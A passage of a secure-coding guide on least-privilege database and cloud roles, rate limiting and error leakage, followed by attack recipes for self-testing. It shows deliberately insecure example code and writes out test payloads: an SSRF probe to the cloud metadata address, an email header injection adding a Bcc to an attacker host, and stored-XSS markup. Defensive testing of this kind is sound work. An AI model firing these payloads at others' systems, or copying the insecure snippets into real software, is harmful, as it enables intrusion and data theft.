**Size for now:** Lockfiles, SHA pins, checksums, OIDC deploy credentials and dependency update PRs. SLSA provenance and private registries can wait.

### SEC-13 Least privilege for service accounts and database roles

**How it fails:** The app runs as a database superuser or table owner, a cloud service account with project-wide editor, or one API key used by every service. Any bug (SSRF, injection, a compromised dependency) then has the full power of that identity: read every tenant, drop tables, bypass row-level security, read every bucket.
**Seen in the wild:** In the Capital One case the stolen role credentials belonged to a WAF role that could list more than 700 S3 buckets and read their data; least-privilege IAM was one of the mitigations discussed [7].
**Spot it in a plan:** "use the default service account", "give it admin for now", "one key for all services", "the worker connects as postgres".
**Spot it in code:** `roles/editor` or `roles/owner` bindings; `SUPERUSER` or `BYPASSRLS` on app roles; the migration role used at runtime; wildcard IAM actions (`"s3:*"`, `"Resource": "*"`); a single shared `SERVICE_API_KEY`.
**Build it right:** One identity per service and per job type. The runtime database role does not own tables, is `NOBYPASSRLS`, and has only the DML it needs; migrations run under a separate role from the deploy job. Append-only tables (audit log) get no `UPDATE`/`DELETE` grant. Cloud roles are granted on specific resources, not projects. Review grants in code (Terraform) so changes are visible in PRs.

Dangerous:
```sql
CREATE ROLE app LOGIN SUPERUSER PASSWORD 'changeme';  -- bypasses RLS, can drop anything
```

Safe:
```sql
CREATE ROLE migrator LOGIN NOSUPERUSER;                -- owns schema objects; used only by deploy
CREATE ROLE app_rw LOGIN NOSUPERUSER NOBYPASSRLS NOCREATEDB NOCREATEROLE;
GRANT USAGE ON SCHEMA app TO app_rw;
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA app TO app_rw;
REVOKE UPDATE, DELETE ON app.audit_log FROM app_rw;    -- append-only from the app's point of view
ALTER DEFAULT PRIVILEGES FOR ROLE migrator IN SCHEMA app GRANT SELECT, INSERT, UPDATE, DELETE ON TABLES TO app_rw;
```

**Prove it:** As `app_rw`, attempt `DROP TABLE`, `ALTER TABLE ... DISABLE ROW LEVEL SECURITY`, `UPDATE app.audit_log`, and a cross-tenant select with no tenant setting; all fail. In the cloud, run the service's identity through a policy simulator for a bucket it should not see.
**Size for now:** Separate runtime and migration roles, per-service identities, resource-scoped grants. Just-in-time human access tooling can wait until access reviews show standing admin access (see `compliance` COMP-07).

### SEC-14 Abuse: rate limits, enumeration and error leakage

**How it fails:** Endpoints answer differently for existing and non-existing accounts ("no account for that email"), so an attacker enumerates customers. Lookup and import features return rich profiles for any phone number or email, so they are scraped at volume. Login, password reset, invite and LLM endpoints have no rate limit, so they are brute-forced or used to run up cost. Unhandled errors return stack traces, SQL fragments or internal hostnames that guide the next attack.
**Seen in the wild:** Ireland's Data Protection Commission fined Meta €265 million in November 2022 after an inquiry into data scraped via Facebook Search and the Messenger and Instagram Contact Importer tools, finding infringements of GDPR Article 25 (data protection by design and default) [21].
**Spot it in a plan:** "look up a user by email/phone", "import contacts", "public profile", "invite by email", "free trial", "show the error to help debugging".
**Spot it in code:** Distinct messages or status codes for "unknown user" versus "wrong password"; no limiter on `/login`, `/password-reset`, `/invite`, `/lookup`, LLM endpoints; error handlers returning `err.message` or `err.stack`; `DEBUG=True` in production settings.
**Build it right:** Uniform responses for existence-revealing flows. Rate limits keyed by the strongest identity available (user, then tenant, then IP), stricter on authentication and lookup routes, stored in Redis so they hold across instances. Per-tenant cost budgets on expensive endpoints (LLM calls). A single error handler that logs the detail with an error id and returns only the id.

Dangerous:
```ts
app.post("/password-reset", async (req, res) => {
  const user = await db.user.findUnique({ where: { email: req.body.email } });
  if (!user) return res.status(404).json({ error: "No account with that email" });
  await sendReset(user);
  res.json({ ok: true });
});
app.use((err: any, _req: Request, res: Response, _next: NextFunction) =>
  res.status(500).json({ error: err.message, stack: err.stack }));
```

Safe:
```ts
const resetLimiter = rateLimit({ windowMs: 15 * 60 * 1000, limit: 5, store: new RedisStore({ sendCommand: (...a: string[]) => redis.sendCommand(a) }) });
app.post("/password-reset", resetLimiter, async (req, res) => {
  const user = await db.user.findUnique({ where: { email: String(req.body.email).toLowerCase() } });
  if (user) await enqueueReset(user.id);          // same response and similar timing either way
  res.status(202).json({ ok: true });
});
app.use((err: unknown, _req: Request, res: Response, _next: NextFunction) => {
  const errorId = crypto.randomUUID();
  log.error({ errorId, err }, "unhandled_error");
  res.status(500).json({ error: "internal_error", errorId });
});
```

**Prove it:** Script 1,000 password-reset requests for random emails from one IP; after the limit they get 429, and responses for real and fake emails are byte-identical. Force a database error; the response body contains only `internal_error` and an id.
**Size for now:** Redis-backed limits on auth, lookup, invite and LLM routes, uniform responses and the error handler. Bot detection and device fingerprinting wait for evidence of abuse.

## Rationalizations to reject

| Rationalization | Why it is wrong | Do instead |
|---|---|---|
| "Only our frontend calls this endpoint." | Anyone can call any public URL with curl; the frontend is not a security boundary. | Authenticate and authorize every route on the server (SEC-01, SEC-02). |
| "The ids are UUIDs, nobody can guess them." | Ids leak through URLs, logs, exports, emails and screenshots. | Check ownership on every access; UUIDs are defense in depth only. |
| "The webhook URL is secret." | URLs leak through logs, proxies and support tickets; a secret URL is not a signature. | Verify the provider's signature on the raw body (SEC-03). |
| "We verify the signature, so duplicates are fine." | Providers retry with fresh signatures; valid duplicates are normal. | Dedupe on event id with a unique constraint (SEC-04). |
| "It is internal, so SSRF does not matter." | SSRF is precisely how an attacker reaches internal services and cloud metadata. | Resolve, check and pin addresses; block redirects (SEC-05). |
| "The ORM protects us from SQL injection." | Raw query helpers and dynamic identifiers bypass parameterization. | Lint for raw queries; allowlist identifiers (SEC-06). |
| "React escapes everything." | Only until someone uses `dangerouslySetInnerHTML` or a `javascript:` href. | Sanitize at every HTML sink and validate URL schemes (SEC-08). |
| "SameSite cookies solve CSRF." | `Lax` still sends cookies on top-level GET navigation and some clients ignore it. | No state change on GET, plus a token or Fetch Metadata check (SEC-09). |
| "The token column is encrypted at rest." | Disk encryption does not stop a SQL read by the app; keys in the same process can be extracted. | Envelope-encrypt with KMS and tenant-bound AAD; limit who can decrypt (SEC-10). |
| "Ask for all scopes now so we do not need re-consent later." | Every stored token becomes maximally powerful; restricted scopes also trigger heavier review. | Request the minimum per feature; add scopes incrementally (SEC-11). |
| "Pinning to `@v2` is pinning." | Tags are mutable; the owner or an attacker can move them. | Pin by commit SHA (SEC-12). |
| "We will tighten permissions after launch." | Broad grants become load-bearing and nobody dares remove them. | Start narrow; widen with a reviewed change (SEC-13). |
| "Detailed errors help customers debug." | They help attackers more. | Return an error id; keep detail in logs (SEC-14). |

## Attack recipes

1. **Route sweep.** Export the route table or OpenAPI spec. Call every route with no cookie, then with a valid viewer-role cookie. Any 2xx outside the public allowlist, or any 2xx on an admin route as viewer, means SEC-01 failed.
2. **Cross-tenant id swap.** As tenant A, create a document, contact and connection. Log in as tenant B and request each by id through every route that accepts an id (GET, PATCH, DELETE, bulk, export, GraphQL). Anything other than 404 means SEC-02 failed.
3. **Webhook forgery and replay.** Post a hand-made Stripe `checkout.session.completed` with no signature; then a real captured event with one body byte changed; then the original captured event after six minutes; then the original twice concurrently. Any fulfilment from the first three, or two fulfilments from the last, means SEC-03 or SEC-04 failed.
4. **Metadata fetch.** In every feature that fetches a URL (webhook test, link unfurl, import, LLM browse tool), submit `http://169.254.169.254/latest/meta-data/`, a hostname you control that resolves to `127.0.0.1`, and a public URL that redirects to `http://10.0.0.1/`. Any connection observed on the internal side means SEC-05 failed.
5. **Header smuggling.** Create a ticket whose subject is `Hello\r\nBcc: you@attacker.example` and trigger a reply. Any message delivered to the Bcc address in the SMTP sink means SEC-07 failed.
6. **Stored XSS through a third party.** Send an email (or Slack message, or CRM note) containing `<img src=x onerror=...>` and a `javascript:` link into a connected account, then open it in the product and in the internal admin tool. Any script execution means SEC-08 failed.
7. **Secret grep.** Run the full test suite with known fake secrets (`sk_test_canary...`, `xoxb-canary...`, a canary refresh token). Search logs, error-tracker events, analytics payloads and LLM request logs for the canaries. Any hit means SEC-10 failed.
8. **OAuth callback swap.** Start an OAuth connect as user A, stop at the callback, and open that callback URL in user B's session. If B's tenant ends up holding A's account connection, SEC-11 failed.
9. **Enumeration timing.** Send 200 password-reset or invite requests alternating real and fake emails. If status codes, bodies or median latency differ measurably, or no 429 appears, SEC-14 failed.

## Sources

1. Trail of Bits, `sharp-edges` skill (structure only), local copy at `ref/tob/plugins/sharp-edges/skills/sharp-edges/SKILL.md`.
2. OWASP API Security Top 10 2023, API1:2023 Broken Object Level Authorization. https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/
3. Krebs on Security, "First American Financial Corp. Leaked Hundreds of Millions of Title Insurance Records" (24 May 2019). https://krebsonsecurity.com/2019/05/first-american-financial-corp-leaked-hundreds-of-millions-of-title-insurance-records/
4. Slack, "Verifying requests from Slack". https://docs.slack.dev/authentication/verifying-requests-from-slack/
5. Stripe, "Receive Stripe events in your webhook endpoint" (signatures, replay, duplicates, secret rolling). https://docs.stripe.com/webhooks
6. Google Cloud, "Authenticate push subscriptions" (Pub/Sub). https://docs.cloud.google.com/pubsub/docs/authenticate-push-subscriptions
7. TechTarget, "Capital One hack highlights SSRF concerns for AWS". https://www.techtarget.com/cybersecurity/news/252467901/Capital-One-hack-highlights-SSRF-concerns-for-AWS
8. OWASP Cheat Sheet Series, Server Side Request Forgery Prevention. https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
9. CISA, Advisory AA23-158A, CL0P exploitation of MOVEit Transfer CVE-2023-34362. https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-158a
10. OWASP Cheat Sheet Series, Logging. https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html
11. OWASP Cheat Sheet Series, Cross Site Scripting Prevention. https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
12. GitHub Blog, "How we found and fixed a rare race condition in our session handling" (18 March 2021). https://github.blog/2021-03-18-how-we-found-and-fixed-a-rare-race-condition-in-our-session-handling/
13. CircleCI, "CircleCI incident report for January 4, 2023 security incident". https://circleci.com/blog/jan-4-2023-incident-report/
14. OWASP Cheat Sheet Series, Cross-Site Request Forgery Prevention. https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
15. Twitter, "Keeping your account secure" (May 2018). https://blog.x.com/official/en_us/topics/company/2018/keeping-your-account-secure.html
16. GitHub Blog, "Security alert: Attack campaign involving stolen OAuth user tokens issued to two third-party integrators" (April 2022). https://github.blog/news-insights/company-news/security-alert-stolen-oauth-user-tokens/
17. IETF RFC 9700, Best Current Practice for OAuth 2.0 Security. https://www.rfc-editor.org/rfc/rfc9700.html
18. Slack, "Installing with OAuth". https://docs.slack.dev/authentication/installing-with-oauth/
19. Slack, "Using token rotation". https://docs.slack.dev/authentication/using-token-rotation/
20. Codecov, Security Update (posted 15 April 2021, updated 29 April 2021). https://about.codecov.io/security-update/
21. Data Protection Commission (Ireland), decision in Facebook data scraping inquiry (28 November 2022). https://www.dataprotection.ie/en/news-media/press-releases/data-protection-commission-announces-decision-in-facebook-data-scraping-inquiry
